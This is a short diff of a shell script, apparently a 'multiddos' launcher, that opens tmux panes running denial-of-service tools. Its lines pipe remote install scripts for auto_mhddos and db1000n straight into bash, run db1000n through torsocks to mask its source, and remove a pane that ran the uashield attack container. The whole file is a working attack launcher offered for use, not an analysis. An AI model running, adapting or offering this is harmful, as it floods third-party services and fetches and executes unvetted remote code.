@@ -27,8 +27,6 @@ tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 0.1
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
 sleep 0.1
-tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
-sleep 0.1
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux select-pane -t 0
